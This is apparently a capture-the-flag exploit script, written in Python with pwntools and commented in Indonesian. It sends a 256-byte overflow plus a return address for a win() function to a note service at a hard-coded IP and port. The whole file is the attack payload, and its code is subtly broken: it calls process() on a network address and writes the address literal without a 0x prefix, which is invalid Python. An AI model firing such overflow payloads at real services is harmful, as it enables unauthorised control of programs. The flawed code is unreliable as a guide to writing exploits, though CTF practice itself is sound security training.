from pwn import *

# Menjalankan proses
p = process("13.229.93.88", 11101)

print(p.recvuntil(b"choice:"))  # Pastikan kamu benar-benar menerima prompt menu
# Menerima menu pilihan
#p.recvuntil(b"choice: ")
p.send(b"1")  # Pilih opsi 1 untuk menambahkan note

p.recvuntil(b"characters):")  # Menunggu prompt untuk memasukkan note

# Membuat payload
payload = b"A" * 256  # Isi buffer sampai 256 bytes
#payload += b"B" * 12   # Padding (coba lebih banyak jika perlu)
payload += p64(00000000004011e6)  # Ganti dengan alamat fungsi win()

print("Payload: ", payload)  # Debugging, pastikan payload sudah benar
p.sendline(payload)  # Kirim payload

# Menerima hasil dan menampilkan output
print(p.recv().decode())  # Output dari aplikasi setelah memasukkan note
print(p.recv().decode())  # Output dari aplikasi setelah memasukkan note
print(p.recv().decode())  # Output dari aplikasi setelah memasukkan note
#print(p.recvall())  # Bisa dipakai kalau ada output tambahan

